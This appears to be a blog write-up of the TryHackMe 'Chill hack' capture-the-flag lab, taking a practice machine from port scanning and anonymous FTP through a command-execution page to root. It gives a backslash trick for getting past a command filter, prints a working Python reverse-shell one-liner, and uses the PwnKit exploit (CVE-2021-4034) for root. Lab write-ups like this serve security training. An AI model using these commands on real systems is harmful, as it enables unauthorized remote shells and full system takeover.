---
layout: post
title: Chill hack - TryHackMe write-up
---
Write-up for Chill hack TryHackMe CTF

Hi hackers, today I'm gonna write-up chill hack, an easy TryHackMe CTF.

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_chillhack/chillhack.png)

## User
First, I did port scanning with rustscan and nmap to find any open ports ()
```
$ rustscan -a chillhack.thm -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

Open 10.10.161.188:21
Open 10.10.161.188:22
Open 10.10.161.188:80

$ nmap -p21,22,80 -A -oN port.txt chillhack.thm
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.53.247
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

After that I started enumerating all services starting from FTP, port 21 was hosting an FTP server allowing anonymous access so I connected and downloaded all file
```
$ ftp chillhack.thm$ ftp chillhack.thm
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
```
note.txt contained the following content:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```
Then, I started testing HTTP (port 80) who was hosting the following static web page:
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_chillhack/webpage.png)
That page contained nothing of useful so I did a directory bruteforce with dirsearch
```
$ dirsearch -u http://chillhack.thm -w $LIST/directory/dir.txt -t 50 -o directory.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 329449

Output File: /home/ubuntu/ctf/tmp/directory.txt

Error Log: /home/ubuntu/.local/lib/python3.9/site-packages/dirsearch/logs/errors-22-05-09_21-24-51.log

Target: http://chillhack.thm/

[21:24:52] Starting: 
[21:25:14] 301 -  312B  - /css  ->  http://chillhack.thm/css/
[21:25:29] 301 -  314B  - /fonts  ->  http://chillhack.thm/fonts/
[21:25:38] 301 -  315B  - /images  ->  http://chillhack.thm/images/
[21:25:41] 301 -  311B  - /js  ->  http://chillhack.thm/js/
[21:26:03] 301 -  315B  - /secret  ->  http://chillhack.thm/secret/
[21:26:04] 403 -  278B  - /server-status
[21:26:19] 200 -   34KB - /index.html

Task Completed
<dirsearch.dirsearch.Program object at 0x7f7cbef0b730>
```
I noticed the page secret and found it contained a remote code execution, I tried to execute some command but there's a filter blocking our commands

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_chillhack/rce.png)

to bypass this filter we can use backslash

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_chillhack/ls.png)

now we can spawn a reverse shell to get user, here's mine:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your IP>",<your port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

## Root
After getting user I started finding somethings to get root, and I found something interesting in OS version:
```
www-data@ubuntu:/tmp$ uname -a
Linux ubuntu 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
It's vulnerable to CVE-2021-4034, so I uploaded [PwnKit](https://github.com/ly4k/PwnKit) onto the server and run it

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_chillhack/pwnkit.png)

It worked, we got root!
See you at the next post, keep hacking
